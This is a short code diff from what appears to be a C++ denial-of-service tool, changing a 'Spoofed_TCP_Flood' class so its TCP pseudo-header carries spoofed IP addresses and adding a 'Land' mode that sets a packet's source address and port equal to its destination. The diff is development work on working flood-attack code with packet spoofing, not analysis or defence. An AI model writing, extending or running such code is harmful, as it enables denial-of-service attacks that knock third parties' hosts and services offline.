@@ -46,9 +46,8 @@ void Spoofed_TCP_Flood::attack(const int *id) {
             dst.sin_addr.s_addr = ip->daddr;
             dst.sin_family = AF_UNSPEC;
 
-
-            psh.source_address = inet_addr(conf->website.c_str());
-            psh.dest_address = dst.sin_addr.s_addr;
+            psh.source_address = ip->saddr;
+            psh.dest_address = ip->daddr;
             psh.placeholder = 0;
             psh.protocol = IPPROTO_TCP;
             psh.length = htons(sizeof(struct tcphdr) + strlen(buf));
@@ -94,6 +93,9 @@ void Spoofed_TCP_Flood::override_headers(tcphdr *tcp, iphdr *ip){
         case config::SpoofedFin:
             tcp->fin = 1;
             break;
+        case config::Land:
+            ip->saddr = ip->daddr;
+            tcp->source = tcp->dest;
         default:break;
     }
 }
